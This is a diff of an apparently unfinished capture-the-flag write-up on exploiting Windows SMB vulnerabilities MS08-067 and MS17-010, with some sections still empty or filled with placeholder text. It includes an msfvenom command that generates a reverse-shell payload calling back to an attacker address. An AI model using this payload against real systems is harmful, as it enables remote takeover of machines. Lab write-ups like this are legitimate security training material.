@@ -15,7 +15,7 @@ Then i did a deeper scan with nmap against 445 port:
 ![smbnmap](https://user-images.githubusercontent.com/43796175/105779606-b5573580-5f3c-11eb-87a3-a4b20fd80a5b.jpg)
 ![smbnmap02](https://user-images.githubusercontent.com/43796175/105779613-b7b98f80-5f3c-11eb-86f4-92610487a8b2.jpg)
 
-Nmap showed MS08-067 (CVE-2008-4250) and MS-17-010 (CVE-2017-0143) are very interesting to exploit.
+Nmap showed MS-08-067 (CVE-2008-4250) and MS-17-010 (CVE-2017-0143) are very interesting to exploit.
 
 # 02: Threat Modeling
 
@@ -26,17 +26,44 @@ In my mental map smbclient and smbmap were the first option to test, but without
 
 # 03: Vulnerability Analysis
 
-Both of these vulnerabilities (MS08-067 & MS-17-010) gives a shell as system and each one have a metasploit module for exploit easily but i will show how exploit this manually.
+Both of these vulnerabilities (MS-08-067 & MS-17-010) gives a shell as system and each one have a metasploit module for exploit easily but i will show how exploit this manually.
 
 # 04: Exploitation
 
-## MS08-067
+## MS-08-067
 
 I will use [this exploit](https://github.com/andyacer/ms08_067) for exploit the vulnerability, this script requires impacket and replace the default shellcode with some of my own. Ok, to make the shellcode i used *msfvenom*:
 
 `
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
 `
+
+The parameters are:
+
+`
+p:
+
+LHOST:
+
+LPORT:
+
+EXITFUNC:
+
+b:
+
+f:
+
+v:
+
+a:
+
+platform:
+
+`
+
+## MS-17-010
+
+asdasdasd
 
 # 05: Post-Exploitation
 
